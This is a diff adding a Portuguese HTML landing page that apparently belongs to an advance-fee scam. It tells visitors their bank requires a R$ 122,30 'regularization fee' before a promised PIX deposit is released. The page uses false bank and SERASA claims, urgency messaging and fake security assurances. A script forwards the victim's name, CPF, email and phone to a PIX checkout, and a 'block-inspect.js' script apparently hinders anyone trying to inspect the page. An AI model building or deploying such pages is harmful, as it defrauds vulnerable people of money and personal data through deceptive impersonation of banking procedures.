@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Regularização Bancária Final - Última Etapa</title>
+<style>
+  body {
+    font-family: 'Arial', sans-serif;
+    background: #f4f6f8;
+    margin: 0;
+    padding: 0;
+    color: #333;
+  }
+
+  .container {
+    max-width: 750px;
+    margin: 50px auto;
+    background: #fff;
+    border-radius: 16px;
+    padding: 40px;
+    box-shadow: 0 12px 35px rgba(0,0,0,0.12);
+  }
+
+  .banner {
+    background: linear-gradient(135deg,#3949ab,#1a237e);
+    color: #fff;
+    border-radius: 12px;
+    padding: 25px;
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .banner h1 {
+    margin: 0;
+    font-size: 28px;
+  }
+
+  .sub {
+    font-size: 18px;
+    color: #444;
+    text-align: center;
+    margin-bottom: 25px;
+    line-height: 1.5;
+  }
+
+  .timeline {
+    display: flex;
+    justify-content: space-between;
+    margin: 30px 0;
+    font-size: 14px;
+  }
+
+  .timeline div {
+    text-align: center;
+    flex: 1;
+    position: relative;
+  }
+
+  .timeline div:not(:last-child)::after {
+    content: '';
+    position: absolute;
+    top: 7px;
+    right: -50%;
+    width: 100%;
+    height: 2px;
+    background: #3949ab;
+    z-index: 0;
+  }
+
+  .timeline div span {
+    display: inline-block;
+    background: #3949ab;
+    color: #fff;
+    border-radius: 50%;
+    width: 28px;
+    height: 28px;
+    line-height: 28px;
+    margin-bottom: 5px;
+    z-index: 1;
+    position: relative;
+  }
+
+  .valor-box {
+    background: #e8eaf6;
+    border-left: 6px solid #3949ab;
+    padding: 20px;
+    font-size: 20px;
+    border-radius: 10px;
+    margin: 25px 0;
+    text-align: center;
+  }
+
+  .beneficios {
+    margin: 30px 0;
+    padding: 0;
+    list-style: none;
+  }
+
+  .beneficios li {
+    margin-bottom: 15px;
+    font-size: 16px;
+    display: flex;
+    align-items: center;
+  }
+
+  .beneficios li::before {
+    content: "✔️";
+    color: #3949ab;
+    font-weight: bold;
+    margin-right: 10px;
+  }
+
+  .cta {
+    display: block;
+    text-align: center;
+    background: #1a237e;
+    color: #fff;
+    font-size: 20px;
+    font-weight: bold;
+    padding: 18px;
+    border-radius: 10px;
+    text-decoration: none;
+    margin: 35px 0 20px;
+    transition: all 0.3s ease;
+    box-shadow: 0 6px 15px rgba(57,73,171,0.3);
+  }
+
+  .cta:hover {
+    background: #0d133d;
+    transform: scale(1.03);
+  }
+
+  .urgencia {
+    background: #fff59d;
+    color: #000;
+    padding: 14px;
+    border-radius: 8px;
+    text-align: center;
+    font-weight: bold;
+    margin-top: 15px;
+    font-size: 15px;
+  }
+
+  .seguro {
+    font-size: 14px;
+    color: #555;
+    text-align: center;
+    margin-top: 20px;
+  }
+
+  .selos {
+    text-align: center;
+    margin-top: 25px;
+  }
+
+  .selos img {
+    height: 40px;
+    margin: 0 10px;
+  }
+</style>
+<!-- Meta Pixel g26 -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1094955653523354');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1094955653523354&ev=PageView&noscript=1" /></noscript>
+<!-- Utmify g26 -->
+<script>
+window.pixelId = "I3rkjjxZonP50FzjkStNJrm899HjlSfkD1JZ";
+var _utmify_g26 = document.createElement("script");
+_utmify_g26.setAttribute("async", "");
+_utmify_g26.setAttribute("defer", "");
+_utmify_g26.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(_utmify_g26);
+</script>
+
+</head>
+<body>
+<div class="container">
+
+  <div class="banner">
+    <h1>🔒 Regularização Bancária Final</h1>
+    <p>Última etapa obrigatória para liberação do seu PIX com total segurança</p>
+  </div>
+
+  <p class="sub">Seu banco exige a <strong>regularização final</strong> para autorizar o depósito. 
+  Esta taxa confirma que não há restri������ão em sua conta, garantindo que o valor seja transferido sem riscos.</p>
+
+  <div class="timeline">
+    <div><span>1</span><br>Tarifa Transacional</div>
+    <div><span>2</span><br>Confirmação SERASA</div>
+    <div><span>3</span><br>Validação Final Banco</div>
+  </div>
+
+  <div class="valor-box">
+    💰 Taxa de regularização: <strong>R$ 122,30</strong><br>
+    (confirmação imediata junto ao banco)
+  </div>
+
+  <ul class="beneficios">
+    <li>Validação oficial da conta antes do PIX</li>
+    <li>Confirmação rápida e segura com o banco</li>
+    <li>Evita bloqueios futuros e problemas de transferência</li>
+    <li>Ambiente totalmente seguro e criptografado</li>
+  </ul>
+
+  <a href="../pagamento/pix.html?produto=up6" class="cta" id="btnCheckout">✅ Quitar taxa e liberar PIX</a>
+
+  <div class="urgencia">⏳ Última etapa obrigatória antes da liberação do valor. Não perca esta oportunidade.</div>
+
+  <p class="seguro">🔒 Transação protegida com criptografia • Ambiente seguro e certificado</p>
+
+  
+
+<script>
+function getParams() {
+  const params = {};
+  const query = window.location.search.substring(1).split("&");
+  query.forEach(part => {
+    const [key, value] = part.split("=");
+    if (key) params[key] = decodeURIComponent((value || "").replace(/\+/g, " "));
+  });
+  return params;
+}
+
+function redirectToCheckout(e) {
+  e.preventDefault();
+  const params = getParams();
+
+  const checkoutBase = "../pagamento/pix.html?produto=up6"; // substitua pelo link real
+
+  const checkoutParams = new URLSearchParams({
+    name: params.name || "",
+    document: params.document || "",
+    email: params.email || "",
+    telephone: params.telephone || ""
+  });
+
+  if (params.utm_source) checkoutParams.set("utm_source", params.utm_source);
+  if (params.utm_campaign) checkoutParams.set("utm_campaign", params.utm_campaign);
+
+  window.location.href = checkoutBase + "?" + checkoutParams.toString();
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const btn = document.querySelector("#btnCheckout");
+  if (btn) {
+    btn.addEventListener("click", redirectToCheckout);
+  }
+});
+</script>
+
+<script src="../assets/js/up-checkout-local.js"></script>
+<script src="../assets/js/block-inspect.js" defer></script>
+</body>
+</html>
